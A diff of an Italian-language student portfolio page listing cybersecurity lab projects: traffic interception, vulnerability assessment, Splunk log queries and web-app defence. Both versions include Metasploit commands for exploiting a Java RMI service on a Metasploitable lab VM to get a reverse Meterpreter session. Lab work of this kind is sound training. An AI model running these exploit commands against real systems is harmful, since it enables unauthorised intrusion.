@@ -5,35 +5,109 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Progetti Cybersecurity – Isabelle Adjetey</title>
   <style>
-    body { font-family: 'Segoe UI', sans-serif; background-color: #f4f4f4; padding: 2em; margin: 0; }
-    h1 { text-align: center; color: #1a237e; }
+    :root {
+      --primary: #0d47a1;
+      --secondary: #1a237e;
+      --bg: #f4f4f4;
+      --card: #ffffff;
+      --border: #e0e0e0;
+      --text: #333333;
+      --tag-bg: #e8eaf6;
+      --tag-col: #555555;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      padding: 2rem;
+      line-height: 1.6;
+    }
+    h1 {
+      text-align: center;
+      color: var(--secondary);
+      margin-bottom: 1.5rem;
+      font-size: 2.5rem;
+    }
+    nav {
+      text-align: center;
+      margin-bottom: 2rem;
+    }
+    nav a {
+      margin: 0 .8rem;
+      color: var(--primary);
+      text-decoration: none;
+      font-weight: bold;
+      transition: color .2s;
+    }
+    nav a:hover { color: var(--secondary); }
+    .projects-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+      gap: 1.5rem;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
     .project {
-      background-color: #ffffff;
+      background: var(--card);
+      border: 1px solid var(--border);
       border-radius: 10px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-      padding: 1.5em;
-      margin: 2em auto;
-      max-width: 900px;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      transition: transform .2s, box-shadow .2s;
     }
-    .project h2 { color: #0d47a1; margin-bottom: 0.5em; }
-    .project p { margin: 0.4em 0; }
-    .project img {
-      max-width: 100%;
-      height: auto;
-      border-radius: 6px;
-      margin: 1em 0;
+    .project:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
     }
-    iframe {
-      width: 100%;
-      height: 500px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-      margin-top: 1em;
+    .project-content {
+      padding: 1.5rem;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+    }
+    .project h2 {
+      color: var(--primary);
+      margin-bottom: .5rem;
+      font-size: 1.4rem;
+    }
+    .project h3 {
+      margin: 1rem 0 .5rem;
+      color: var(--secondary);
+      font-size: 1.1rem;
+    }
+    .project p {
+      margin: .5rem 0;
+    }
+    .project ul {
+      list-style: none;
+      padding: 0;
+      margin: .5rem 0;
+    }
+    .project ul li {
+      margin: .4rem 0;
+    }
+    .project ul li a {
+      text-decoration: none;
+      color: var(--primary);
+      border: 1px solid var(--primary);
+      padding: .3rem .6rem;
+      border-radius: 5px;
+      transition: background .2s, color .2s;
+    }
+    .project ul li a:hover {
+      background: var(--primary);
+      color: #fff;
     }
     .tags {
-      color: #555;
-      font-size: 0.9em;
-      font-style: italic;
+      margin-top: auto;
+      font-size: .85rem;
+      color: var(--tag-col);
+      background: var(--tag-bg);
+      padding: .5rem .8rem;
+      border-radius: 5px;
+      display: inline-block;
     }
   </style>
 </head>
@@ -41,226 +115,157 @@
 
   <h1>📁 Progetti in Cybersecurity</h1>
 
+  <nav>
+    <a href="#anz">ANZ Forage</a>
+    <a href="#client-server">Client-Server</a>
+    <a href="#gameshell">GameShell</a>
+    <a href="#vuln-assessment">Vuln Assessment</a>
+    <a href="#java-rmi">Java RMI</a>
+    <a href="#web-app">Web App</a>
+    <a href="#splunk">Splunk</a>
+  </nav>
 
-  <div class="project">
-  <h2>🌐 Simulazione Client-Server con Intercettazione HTTPS/HTTP</h2>
-  <p><strong>Tool:</strong> Kali Linux (192.168.32.100), Windows 7 (192.168.32.101), BIND9, Apache (HTTP/HTTPS), Wireshark, Chrome/Firefox</p>
-  <p><strong>Obiettivi:</strong><br>
-    Configurare DNS per epicode.internal → 192.168.32.100;<br>
-    attivare server HTTPS con certificato autofirmato;<br>
-    catturare traffico HTTPS e HTTP;<br>
-    analizzare differenze in termini di visibilità e sicurezza
-  </p>
-  <p><strong>Risultati:</strong><br>
-    Identificati MAC address di sorgente e destinazione;<br>
-    traffico HTTPS criptato (payload non leggibile, solo handshake TLS visibile);<br>
-    traffico HTTP in chiaro (richieste e risposte completamente leggibili)
-  </p>
-  <img src="URL-dello-screenshot-HTTPS" alt="Handshake TLS in Wireshark">
-  <img src="URL-dello-screenshot-HTTP" alt="Richiesta HTTP in Wireshark">
+  <section id="projects" class="projects-grid">
 
-  <div class="project-pdf">
-    <a href="https://github.com/isabelleadjetey/IsabelleAdjetey_Epicode/blob/main/Progetto%20M1.pdf" target="_blank">
-      Scarica il PDF di svolgimento del progetto
-    </a>
-  </div>
+    <!-- ANZ Forage Internship -->
+    <div class="project" id="anz">
+      <div class="project-content">
+        <h2>🛡️ ANZ Cyber Security Management – Job Simulation</h2>
+        <p><strong>Periodo:</strong> Giugno 2025 (Remoto)</p>
+        <p>Esperienza Forage per ANZ: investigazioni su email sospette e traffico PCAP simulato per affinare capacità forensi.</p>
+        <p><strong>Certificato:</strong> 
+          <a href="https://forage-uploads-prod.s3.amazonaws.com/completion-certificates/…pdf" target="_blank">
+            Visualizza certificato
+          </a>
+        </p>
 
-  <p class="tags">#DNS #HTTPS #HTTP #Wireshark #NetworkLab #Security</p>
-</div>
+        <h3>Task</h3>
+        <ul>
+          <li>
+            <a href="https://github.com/isabelleadjetey/IsabelleAdjetey_Epicode/tree/main/task1" target="_blank">
+              📧 Task 1 – Analisi Email
+            </a>
+          </li>
+          <li>
+            <a href="https://github.com/isabelleadjetey/IsabelleAdjetey_Epicode/tree/main/task2" target="_blank">
+              📡 Task 2 – Analisi PCAP
+            </a>
+          </li>
+        </ul>
 
+        <p class="tags">#ANZ #Forage #Phishing #PCAP #Steganografia</p>
+      </div>
+    </div>
 
-<div class="project">
-  <h2>🎮 GameShell Shell Familiarization</h2>
-  <p><strong>Tool:</strong> Kali Linux, apt, shell utilities (gettext, man-db, procps, psmisc, nano, tree, bsdmainutils, x11-apps), wget</p>
-  <p><strong>Obiettivi:</strong><br>
-    Installare GameShell per esercitarsi con i comandi di shell in ambiente Kali Linux
-  </p>
-  <p><strong>Installazione:</strong><br>
-    sudo apt update<br>
-    sudo apt install gettext man-db procps psmisc nano tree bsdmainutils x11-apps wget<br>
-    wget https://github.com/phyver/GameShell/releases/download/latest/gameshell.sh
-  </p>
-  <p><strong>Avvio del gioco:</strong><br>
-    bash gameshell.sh
-  </p>
-  <p><strong>Sviluppo del gioco:</strong><br>
-    Cercate di completare quanti più livelli possibili
-  </p>
-  <div class="project-pdf">
-    <a href="https://github.com/isabelleadjetey/IsabelleAdjetey_Epicode/blob/main/Progetto%20M2%20-%20Gameshell.pdf" target="_blank">
-      Scarica il PDF di svolgimento del progetto
-    </a>
-  </div>
-  <p class="tags">#GameShell #ShellExercise #KaliLinux</p>
-</div>
+    <!-- Simulazione Client-Server -->
+    <div class="project" id="client-server">
+      <div class="project-content">
+        <h2>🌐 Simulazione Client-Server con Intercettazione HTTPS/HTTP</h2>
+        <p><strong>Tool:</strong> Kali Linux, Windows 7, BIND9, Apache, Wireshark</p>
+        <p><strong>Obiettivo:</strong> Configurare DNS, server HTTPS con certificato autofirmato, intercettare traffico HTTP vs HTTPS.</p>
+        <p><strong>Risultati:</strong> Analisi di MAC, handshake TLS e traffico in chiaro.</p>
+        <p>
+          <a href="https://github.com/isabelleadjetey/IsabelleAdjetey_Epicode/blob/main/Progetto%20M1.pdf" target="_blank">
+            📄 PDF su GitHub
+          </a>
+        </p>
+        <p class="tags">#DNS #HTTPS #HTTP #Wireshark</p>
+      </div>
+    </div>
 
-<div class="project">
-  <h2>🔍 Vulnerability Assessment & Remediation su Metasploitable</h2>
-  <p><strong>Tool:</strong> Kali Linux, Nmap, Nessus, iptables</p>
-  <p><strong>Traccia & Requisiti:</strong><br>
-    Effettuare una scansione completa sul target Metasploitable;<br>
-    selezionare da 2 a 4 vulnerabilità critiche (evidenziate in giallo);<br>
-    implementare azioni di rimedio (patch o regole firewall);<br>
-    rieseguire la scansione e confrontare i risultati
-  </p>
-  <p><strong>Consegna:</strong></p>
-  <ul>
-    <li>
-      <a href="https://github.com/isabelleadjetey/IsabelleAdjetey_Epicode/blob/main/ScanzioneInizio.pdf?raw=true" target="_blank">
-        📄 ScansioneInizio.pdf
-      </a>  
-      (grafico vulnerabilità iniziali)
-    </li>
-    <li>
-      <a href="https://github.com/isabelleadjetey/IsabelleAdjetey_Epicode/blob/main/RemediationMeta.pdf?raw=true" target="_blank">
-        📄 RemediationMeta.pdf
-      </a>  
-      (screenshot e spiegazione dei passaggi di remediation)
-    </li>
-    <li>
-      <a href="https://github.com/tuo-username/metasploitable-remediation/ScansioneFine.pdf?raw=true" target="_blank">
-        📄 ScansioneFine.pdf
-      </a>  
-      (grafico vulnerabilità dopo le modifiche)
-    </li>
-  </ul>
-  <p class="tags">#Metasploitable #VulnerabilityAssessment #Nmap #Nessus #Remediation #iptables</p>
-</div>
+    <!-- GameShell Familiarization -->
+    <div class="project" id="gameshell">
+      <div class="project-content">
+        <h2>🎮 GameShell Shell Familiarization</h2>
+        <p><strong>Tool:</strong> Kali Linux, shell utilities, wget</p>
+        <p><strong>Obiettivo:</strong> Installare e utilizzare GameShell per esercitazioni shell.</p>
+        <p><strong>Procedura:</strong> apt install … &amp; bash gameshell.sh</p>
+        <p>
+          <a href="https://github.com/isabelleadjetey/IsabelleAdjetey_Epicode/blob/main/Progetto%20M2%20-%20Gameshell.pdf" target="_blank">
+            📄 PDF su GitHub
+          </a>
+        </p>
+        <p class="tags">#GameShell #ShellExercise #KaliLinux</p>
+      </div>
+    </div>
 
-<div class="project">
-  <h2>🛠️ Java RMI Exploitation su Metasploitable</h2>
-  <p><strong>Tool:</strong> Kali Linux (192.168.11.111), Metasploit Framework, Metasploitable (192.168.11.112)</p>
-  <p><strong>Traccia & Requisiti:</strong><br>
-    La macchina vittima espone un servizio Java RMI vulnerabile sulla porta 1099.  
-    Utilizzare Metasploit per ottenere una sessione Meterpreter.<br>
-    Kali IP: 192.168.11.111 – Metasploitable IP: 192.168.11.112
-  </p>
-  <p><strong>Procedura:</strong><br>
-    • msfconsole<br>
-    • use exploit/multi/misc/java_rmi_server<br>
-    • set RHOST 192.168.11.112<br>
-    • set RPORT 1099<br>
-    • set PAYLOAD java/meterpreter/reverse_tcp<br>
-    • set LHOST 192.168.11.111<br>
-    • exploit
-  </p>
-  <p><strong>Evidenze raccolte:</strong><br>
-    • ip addr (configurazione di rete)<br>
-    • ip route show (tabella di routing)<br>
-    • <em>altri comandi e output rilevanti</em>
-  </p>
-  <div class="project-pdf">
-    <a href="https://github.com/isabelleadjetey/IsabelleAdjetey_Epicode/blob/main/Progetto%20M4.pdf" target="_blank">
-      Scarica il PDF di svolgimento del progetto
-    </a>
-  </div>
-  <p class="tags">#JavaRMI #Metasploit #Meterpreter #Exploit #Metasploitable</p>
-</div>
+    <!-- Vulnerability Assessment -->
+    <div class="project" id="vuln-assessment">
+      <div class="project-content">
+        <h2>🔍 Vulnerability Assessment & Remediation – Metasploitable</h2>
+        <p><strong>Tool:</strong> Nmap, Nessus, iptables</p>
+        <p><strong>Obiettivo:</strong> Scansione, patching e regole firewall; verifica post-rim</p>
+        <ul>
+          <li>
+            <a href="https://github.com/isabelleadjetey/IsabelleAdjetey_Epicode/blob/main/ScanzioneInizio.pdf" target="_blank">📄 ScansioneInizio.pdf</a>
+          </li>
+          <li>
+            <a href="https://github.com/isabelleadjetey/IsabelleAdjetey_Epicode/blob/main/RemediationMeta.pdf" target="_blank">📄 RemediationMeta.pdf</a>
+          </li>
+          <li>
+            <a href="https://github.com/isabelleadjetey/tuo-username/metasploitable-remediation/ScansioneFine.pdf" target="_blank">📄 ScansioneFine.pdf</a>
+          </li>
+        </ul>
+        <p class="tags">#Metasploitable #Nmap #Nessus #iptables</p>
+      </div>
+    </div>
 
-<div class="project">
-  <h2>🛡️ Web App Security Analysis & Response</h2>
-  <p><strong>Traccia & Requisiti:</strong><br>
-    Con riferimento alla figura in slide 2, rispondere ai seguenti quesiti sulla protezione e gestione di un’applicazione Web esposta in DMZ.
-  </p>
-  <p><strong>Quesiti e Soluzioni:</strong></p>
-  <ol>
-    <li>
-      <strong>Azioni preventive:</strong><br>
-      Identificare e posizionare filtri WAF o input‐validation per prevenire SQLi e XSS.  
-      <em>(Modificare slide 2 evidenziando i filtri a livello di WAF e di codice applicativo.)</em>
-    </li>
-    <li>
-      <strong>Impatti sul business:</strong><br>
-      Un DDoS di 10 minuti interrompe il servizio.  
-      Impatto = 10 min × 1.500 €/min = 15.000 €.  
-      Proposte preventive: CDN con rate‐limiting, soluzioni di anti‐DDoS.
-    </li>
-    <li>
-      <strong>Response:</strong><br>
-      In caso di infezione malware, isolare il server infetto (network quarantine) senza rimuovere l’accesso all’attaccante.  
-      <em>(Aggiornare slide 2 con la VLAN di quarantena e regole di ACL sul firewall.)</em>
-    </li>
-    <li>
-      <strong>Soluzione completa:</strong><br>
-      Combinare le azioni preventive (punto 1) e la response (punto 3) in un unico diagramma.
-    </li>
-    <li>
-      <strong>Modifica “più aggressiva” (opzionale):</strong><br>
-      Introdurre un IDS/IPS centralizzato e segmentazione della rete interna per mitigare ulteriormente gli attacchi (punto 2).
-    </li>
-  </ol>
-  <div class="project-pdf">
-    <a href="https://github.com/isabelleadjetey/IsabelleAdjetey_Epicode/blob/main/Progetto%20M5.pdf" target="_blank">
-      Scarica il PDF di svolgimento del progetto
-    </a>
-  </div>
-  //
-  <p class="tags">#WebSecurity #SQLi #XSS #DDoS #IncidentResponse #WAF #NetworkSegmentation</p>
-</div>
+    <!-- Java RMI Exploitation -->
+    <div class="project" id="java-rmi">
+      <div class="project-content">
+        <h2>🛠️ Java RMI Exploitation – Metasploitable</h2>
+        <p><strong>Tool:</strong> Metasploit Framework</p>
+        <p><strong>Obiettivo:</strong> Ottenere sessione Meterpreter via Java RMI</p>
+        <p>
+          <code>use exploit/multi/misc/java_rmi_server<br>
+          set RHOST 192.168.11.112<br>
+          set LHOST 192.168.11.111<br>
+          exploit</code>
+        </p>
+        <p>
+          <a href="https://github.com/isabelleadjetey/IsabelleAdjetey_Epicode/blob/main/Progetto%20M4.pdf" target="_blank">
+            📄 PDF su GitHub
+          </a>
+        </p>
+        <p class="tags">#JavaRMI #Metasploit #Meterpreter</p>
+      </div>
+    </div>
 
-<div class="project">
-  <h2>📊 Splunk Log Analysis Lab</h2>
-  <p><strong>Tool:</strong> Splunk Enterprise, tutorialdata.zip</p>
-  <p><strong>Obiettivi:</strong><br>
-    Importare i dati “tutorialdata.zip” in Splunk ed eseguire query SPL per analizzare autenticazioni SSH e errori server.</p>
-  <p><strong>Query Principali:</strong><br>
-    1. Tentativi di accesso falliti “Failed password”:<br>
-       <code>index=main "Failed password" | table _time, src_ip, user, message</code><br>
-    2. Sessioni SSH riuscite per djohnson:<br>
-       <code>index=main "session opened for user" user="djohnson" | table _time, user, uid</code><br>
-    3. Tentativi falliti da 86.212.199.60:<br>
-       <code>index=main "Failed password" src_ip="86.212.199.60" | table _time, user, dest_port</code><br>
-    4. IP con più di 5 tentativi falliti:<br>
-       <code>index=main "Failed password" | stats count by src_ip | where count > 5</code><br>
-    5. Internal Server Error:<br>
-       <code>index=main status=500 OR "Internal Server Error" | table _time, src_ip, message</code>
-  </p>
-  <p><strong>Conclusioni:</strong><br>
-    L’analisi evidenzia un piccolo cluster di IP responsabili di ripetuti tentativi di “Failed password” (brute-force) e errori 500 sporadici, suggerendo l’introduzione di rate-limiting e ulteriori controlli di stabilità applicativa.</p>
-  <div class="project-github">
-    <a href="https://github.com/isabelleadjetey/IsabelleAdjetey_Epicode/blob/main/Progetto%20M6.pdf" target="_blank">
-      Vai al repository GitHub di Splunk Log Analysis
-    </a>
-  </div>
-  <p class="tags">#Splunk #LogAnalysis #SSH #SIEM #SecurityAnalytics</p>
-</div>
+    <!-- Web App Security Analysis -->
+    <div class="project" id="web-app">
+      <div class="project-content">
+        <h2>🛡️ Web App Security Analysis & Response</h2>
+        <p><strong>Obiettivi:</strong> Protezione di un’app in DMZ, prevenzione SQLi/XSS, risposta DDoS e incident response.</p>
+        <p><strong>Soluzioni:</strong></p>
+        <ol>
+          <li>WAF &amp; input validation</li>
+          <li>Mitigazione DDoS (CDN, rate‐limiting)</li>
+          <li>Quarantena rete per malware</li>
+        </ol>
+        <p>
+          <a href="https://github.com/isabelleadjetey/IsabelleAdjetey_Epicode/blob/main/Progetto%20M5.pdf" target="_blank">
+            📄 PDF su GitHub
+          </a>
+        </p>
+        <p class="tags">#WebSecurity #SQLi #XSS #DDoS #IncidentResponse</p>
+      </div>
+    </div>
 
-  <div class="project">
-    <h2>🛠️ Penetration Testing Lab</h2>
-    <p><strong>Tool:</strong> Kali Linux, Nmap, Nessus, Hydra, Burp Suite</p>
-    <p><strong>Obiettivo:</strong> Attacco simulato su macchina Metasploitable</p>
-    <p><strong>Risultato:</strong> Report su ricognizione, exploit ed escalation dei privilegi</p>
-    <img src="https://github.com/tuo-username/progetto1/screenshot.jpg" alt="Screenshot PenTest">
-    <iframe src="https://github.com/tuo-username/progetto1/report.pdf?raw=true" title="PDF PenTest"></iframe>
-    <p class="tags">#pentesting #metasploitable #linux</p>
-  </div>
+    <!-- Splunk Lab -->
+    <div class="project" id="splunk">
+      <div class="project-content">
+        <h2>📊 Splunk Log Analysis Lab</h2>
+        <p><strong>Tool:</strong> Splunk Enterprise</p>
+        <p><strong>Obiettivo:</strong> Query SPL su “tutorialdata.zip” per analisi SSH e errori server.</p>
+        <p>
+          <a href="https://github.com/isabelleadjetey/IsabelleAdjetey_Epicode/blob/main/Progetto%20M6.pdf" target="_blank">
+            📄 PDF su GitHub
+          </a>
+        </p>
+        <p class="tags">#Splunk #LogAnalysis #SSH #SIEM</p>
+      </div>
+    </div>
 
-  <div class="project">
-    <h2>🧠 Automazione Log Analysis con Python</h2>
-    <p><strong>Tool:</strong> Python, Bash, Splunk</p>
-    <p><strong>Obiettivo:</strong> Parsing automatico dei log e detection delle anomalie</p>
-    <img src="https://github.com/tuo-username/progetto2/log-analysis.png" alt="Screenshot Log Analysis">
-    <iframe src="https://github.com/tuo-username/progetto2/report.pdf?raw=true" title="PDF Log Analysis"></iframe>
-    <p class="tags">#SIEM #automation #python</p>
-  </div>
-
-  <div class="project">
-    <h2>☁️ Simulazioni Cloud Security su Azure</h2>
-    <p><strong>Tool:</strong> Azure AD, Microsoft Sentinel, Defender for Cloud</p>
-    <p><strong>Obiettivo:</strong> Implementazione del principio del minimo privilegio</p>
-    <img src="https://github.com/tuo-username/progetto3/azure-security.png" alt="Screenshot Azure Security">
-    <iframe src="https://github.com/tuo-username/progetto3/report.pdf?raw=true" title="PDF Azure"></iframe>
-    <p class="tags">#cloudsecurity #azure #sentinel</p>
-  </div>
-
-  <div class="project">
-    <h2>📊 Incident Response & SIEM Dashboards</h2>
-    <p><strong>Tool:</strong> Splunk, Wireshark</p>
-    <p><strong>Obiettivo:</strong> Creazione di dashboard per eventi sospetti e alert personalizzati</p>
-    <img src="https://github.com/tuo-username/progetto4/splunk-dashboard.png" alt="Dashboard Screenshot">
-    <iframe src="https://github.com/tuo-username/progetto4/report.pdf?raw=true" title="PDF SIEM"></iframe>
-    <p class="tags">#incidentresponse #splunk #logmonitoring</p>
-  </div>
-
+  </section>
 </body>
 </html>
